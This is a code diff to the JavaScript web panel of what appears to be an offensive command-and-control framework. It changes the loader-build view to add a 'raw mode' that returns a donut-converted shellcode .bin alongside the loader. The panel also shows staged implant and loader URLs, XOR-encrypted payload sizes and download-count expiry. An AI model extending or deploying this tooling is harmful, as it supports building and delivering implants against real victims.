@@ -14241,30 +14241,48 @@ async function buildLoader() {
   };
 
   const res = document.getElementById('ldr-result');
-  res.innerHTML = '<div class="result-card" style="color:var(--yellow)">⏳ Building… (implant + donut + staging ~30s)</div>';
+  res.innerHTML = `<div class="result-card" style="color:var(--yellow)">⏳ Building… ${isRaw ? '(implant + donut, ~20s)' : '(implant + donut + staging ~30s)'}</div>`;
   const r = await api('POST', '/api/build', body);
   if (r.ok) {
     const d = r.data || {};
-    const loaderFile   = (d.loader || '').split('/').pop();
-    const rawKB        = d.raw_kb || '?';
-    const compKB       = d.compressed_kb || rawKB;
-    const stageEndpt   = d.bin_stage || '';
-    const loaderStage  = d.loader_stage || '';
-    const dlURL        = loaderFile ? `${BASE}/api/artifacts/${encodeURIComponent(loaderFile)}?token=${encodeURIComponent(TOKEN)}` : '';
-    const sizeLabel    = d.compressed_kb ? `${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> compressed+XOR` : `${esc(rawKB)} KB (XOR encrypted)`;
-    res.innerHTML = `
-      <div class="result-card" style="border-color:var(--green)">
-        <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo</div>
-        <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
-          <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
-          <div><span style="color:var(--text3)">Staged implant:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
-          <div><span style="color:var(--text3)">Size:</span> ${sizeLabel}</div>
-          <div style="word-break:break-all"><span style="color:var(--text3)">Implant URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code> <button class="btn btn-ghost btn-sm" style="padding:1px 6px;font-size:10px" onclick="navigator.clipboard.writeText(${JSON.stringify(stageEndpt)})">⎘</button></div>
-          ${loaderStage ? `<div style="word-break:break-all"><span style="color:var(--text3)">Loader URL:</span> <code style="font-size:10px">${esc(loaderStage)}</code> <button class="btn btn-ghost btn-sm" style="padding:1px 6px;font-size:10px" onclick="navigator.clipboard.writeText(${JSON.stringify(loaderStage)})">⎘</button></div>` : ''}
-          ${maxdl > 0 ? `<div style="color:var(--yellow)">⚠ Stage expira tras ${maxdl} descarga${maxdl>1?'s':''}</div>` : ''}
-        </div>
-        ${dlURL ? `<a class="btn btn-ghost btn-sm" href="${esc(dlURL)}" style="margin-top:8px;display:inline-block" download>⬇ Download loader</a>` : ''}
-      </div>`;
+    const loaderFile = (d.loader || '').split('/').pop();
+    const dlURL      = loaderFile ? `${BASE}/api/artifacts/${encodeURIComponent(loaderFile)}?token=${encodeURIComponent(TOKEN)}` : '';
+    if (isRaw) {
+      const binFile  = (d.bin || '').split('/').pop();
+      const binDlURL = binFile ? `${BASE}/api/artifacts/${encodeURIComponent(binFile)}?token=${encodeURIComponent(TOKEN)}` : '';
+      res.innerHTML = `
+        <div class="result-card" style="border-color:var(--green)">
+          <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo <span style="font-weight:400;color:var(--text3)">(raw mode)</span></div>
+          <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
+            <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
+            <div><span style="color:var(--text3)">Raw .bin:</span> <code>${esc(binFile)}</code></div>
+            <div style="color:var(--text3)">Host the .bin at: <code style="color:var(--accent)">${esc(payloadURL)}</code></div>
+          </div>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px">
+            ${dlURL    ? `<a class="btn btn-ghost btn-sm" href="${esc(dlURL)}"    download>⬇ Download loader</a>` : ''}
+            ${binDlURL ? `<a class="btn btn-ghost btn-sm" href="${esc(binDlURL)}" download>⬇ Download .bin</a>` : ''}
+          </div>
+        </div>`;
+    } else {
+      const rawKB       = d.raw_kb || '?';
+      const compKB      = d.compressed_kb || rawKB;
+      const stageEndpt  = d.bin_stage || '';
+      const loaderStage = d.loader_stage || '';
+      const sizeLabel   = d.compressed_kb ? `${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> compressed+XOR` : `${esc(rawKB)} KB (XOR encrypted)`;
+      res.innerHTML = `
+        <div class="result-card" style="border-color:var(--green)">
+          <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo</div>
+          <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
+            <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
+            <div><span style="color:var(--text3)">Staged implant:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
+            <div><span style="color:var(--text3)">Size:</span> ${sizeLabel}</div>
+            <div style="word-break:break-all"><span style="color:var(--text3)">Implant URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code> <button class="btn btn-ghost btn-sm" style="padding:1px 6px;font-size:10px" onclick="navigator.clipboard.writeText(${JSON.stringify(stageEndpt)})">⎘</button></div>
+            ${loaderStage ? `<div style="word-break:break-all"><span style="color:var(--text3)">Loader URL:</span> <code style="font-size:10px">${esc(loaderStage)}</code> <button class="btn btn-ghost btn-sm" style="padding:1px 6px;font-size:10px" onclick="navigator.clipboard.writeText(${JSON.stringify(loaderStage)})">⎘</button></div>` : ''}
+            ${maxdl > 0 ? `<div style="color:var(--yellow)">⚠ Stage expira tras ${maxdl} descarga${maxdl>1?'s':''}</div>` : ''}
+          </div>
+          ${dlURL ? `<a class="btn btn-ghost btn-sm" href="${esc(dlURL)}" style="margin-top:8px;display:inline-block" download>⬇ Download loader</a>` : ''}
+        </div>`;
+    }
     toast('Loader built!', 'green');
   } else {
     res.innerHTML = `<div class="result-card" style="color:var(--red)">✗ ${esc(r.error || 'Error building loader')}</div>`;
